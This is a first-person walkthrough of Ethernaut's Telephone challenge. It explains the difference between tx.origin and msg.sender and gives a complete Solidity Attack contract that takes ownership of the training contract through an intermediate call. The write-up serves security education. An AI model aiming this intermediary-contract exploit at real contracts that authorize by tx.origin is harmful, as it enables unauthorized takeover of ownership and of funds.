# Ethernaut Level 4 — Telephone

## Introduction

**Telephone** is Level 4 of OpenZeppelin's Ethernaut Web3 CTF.

The goal of this level is simple: **become the owner of the `Telephone` contract**.

When I first looked at the code, the main thing that caught my attention was:

```solidity
if (tx.origin != msg.sender)
```

I already knew about `msg.sender`, but `tx.origin` was new to me. At first I thought they basically meant the same thing, so I was confused about why the contract was checking whether they were different.

After looking at how calls work when another contract is involved, I realized I could make them different by putting my own contract in between my wallet and the Telephone contract.

### What this level teaches

- `msg.sender`
- `tx.origin`
- Contract-to-contract calls
- Interfaces
- How `msg.sender` changes between contract calls
- Why using `tx.origin` for authorization can be dangerous

---

## Objective

The objective is to change the owner of the `Telephone` contract to my own address.

The contract stores the owner here:

```solidity
address public owner;
```

and initially sets it in the constructor:

```solidity
constructor() {
    owner = msg.sender;
}
```

The function that can change the owner is:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

So the main question was:

**How do I make `tx.origin` and `msg.sender` different?**

---

## 1. Going Through the Telephone Contract

I first went through the contract given by Ethernaut.

```solidity
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

There isn't actually much code here, so I focused on understanding what each part was doing.

### `owner`

```solidity
address public owner;
```

This stores the current owner of the contract.

Since it is `public`, Solidity automatically creates a getter for it, so I can check the owner from the console.

### `constructor()`

```solidity
constructor() {
    owner = msg.sender;
}
```

The constructor runs when the contract is deployed.

The account deploying the contract becomes the initial owner because `msg.sender` is the deployer during deployment.

### `changeOwner()`

This is the interesting function:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

There is no `onlyOwner` modifier here. Instead, the contract only checks whether `tx.origin` and `msg.sender` are different.

That made `tx.origin` the main thing I needed to understand.

---

## 2. Understanding `msg.sender`

`msg.sender` is the **immediate caller** of the current function.

For example, if I directly call the Telephone contract from my wallet:

```text
My Wallet → Telephone
```

then inside Telephone:

```text
msg.sender = My Wallet
```

But if another contract calls Telephone:

```text
My Wallet → Attack Contract → Telephone
```

then Telephone sees the Attack Contract as its immediate caller.

So inside Telephone:

```text
msg.sender = Attack Contract
```

This was important for the exploit.

---

## 3. Understanding `tx.origin`

This was the part I initially got confused about.

`tx.origin` is the **original account that started the transaction**.

So if the call chain is:

```text
My Wallet → Attack Contract → Telephone
```

then inside Telephone:

```text
tx.origin  = My Wallet
msg.sender = Attack Contract
```

They are now different.

But if I call Telephone directly:

```text
My Wallet → Telephone
```

then:

```text
tx.origin  = My Wallet
msg.sender = My Wallet
```

They are the same.

That gave me the condition I needed:

```solidity
tx.origin != msg.sender
```

---

## 4. Finding the Exploit

Once I understood the difference, the exploit idea became pretty clear.

I needed to create this call chain:

```text
My Wallet
    ↓
Attack Contract
    ↓
Telephone
```

My wallet would start the transaction.

Then my Attack contract would call `Telephone.changeOwner()`.

When Telephone receives that call:

```text
tx.origin  = My Wallet
msg.sender = Attack Contract
```

Therefore:

```solidity
tx.origin != msg.sender
```

is true.

The contract then executes:

```solidity
owner = _owner;
```

So all I needed was a way to make my Attack contract call `changeOwner()` with my wallet address.

---

## 5. Creating the Attack Contract

I created a separate exploit contract and used an interface to interact with the already deployed Telephone contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    ITelephone telephone;

    constructor(address _target) {
        telephone = ITelephone(_target);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
```

I didn't need to copy the entire Telephone contract.

I only needed the function I wanted to call, so I defined it inside an interface:

```solidity
interface ITelephone {
    function changeOwner(address _owner) external;
}
```

---

## 6. Connecting the Attack Contract to Telephone

I then created a reference to the target:

```solidity
ITelephone telephone;
```

The constructor takes an address:

```solidity
constructor(address _target) {
    telephone = ITelephone(_target);
}
```

When deploying the Attack contract, I supplied the **Ethernaut Telephone instance address** as `_target`.

This line:

```solidity
telephone = ITelephone(_target);
```

basically tells my Attack contract:

> this is the Telephone contract I want to interact with.

Now my exploit contract was connected to the actual Ethernaut instance.

---

## 7. The Important Part of the Attack

The actual exploit is only one line:

```solidity
telephone.changeOwner(msg.sender);
```

When I call:

```text
My Wallet → Attack.attack()
```

inside the Attack contract:

```text
msg.sender = My Wallet
```

So `msg.sender` is passed as the `_owner` argument.

The Attack contract then calls:

```text
Attack Contract → Telephone.changeOwner()
```

Now Telephone sees:

```text
tx.origin  = My Wallet
msg.sender = Attack Contract
```

Therefore:

```solidity
tx.origin != msg.sender
```

is true.

Telephone then executes:

```solidity
owner = _owner;
```

and `_owner` is my wallet address.

So I become the owner.

---

## 8. Why Directly Calling `changeOwner()` Doesn't Work

I also had to understand why I couldn't just call the function directly.

If the call is:

```text
My Wallet → Telephone.changeOwner()
```

then inside Telephone:

```text
tx.origin  = My Wallet
msg.sender = My Wallet
```

So:

```solidity
tx.origin != msg.sender
```

is false.

The owner won't change.

The Attack contract is needed because it creates an extra step:

```text
My Wallet
    ↓
Attack Contract
    ↓
Telephone
```

That extra step is what makes:

```text
tx.origin ≠ msg.sender
```

inside Telephone.

---

## 9. Deploying the Attack Contract

After writing the exploit contract, I deployed it using the **instance address of my Ethernaut Telephone challenge**.

The constructor expects:

```solidity
constructor(address _target)
```

so I entered my Telephone instance address while deploying it.

After deployment, the Attack contract was connected to my specific Telephone instance.

---

## 10. Executing the Attack

After deploying the Attack contract, I called:

```solidity
attack()
```

The call flow was:

```text
My Wallet
    ↓
Attack.attack()
    ↓
Telephone.changeOwner()
```

Inside Telephone:

```text
tx.origin  = My Wallet
msg.sender = Attack Contract
```

So the condition passed:

```solidity
if (tx.origin != msg.sender)
```

and the owner was changed to my wallet.

---

## 11. Verifying the Owner

Finally, I checked the `owner` of the Telephone instance to confirm that it had changed.

The main thing I learned from this level was the difference between `tx.origin` and `msg.sender`.

Before this level, I was thinking they were basically the same thing. The important difference is that:

```text
tx.origin
```

stays as the original account that started the transaction, while:

```text
msg.sender
```

changes to the immediate caller at each contract call.

That gave me the exploit:

```text
My Wallet
    ↓
Attack Contract
    ↓
Telephone

tx.origin  = My Wallet
msg.sender = Attack Contract

tx.origin != msg.sender
        ↓
owner = My Wallet
```

After confirming that I had become the owner, I submitted the level instance in Ethernaut.

---

## Level 4 — Completed ✅
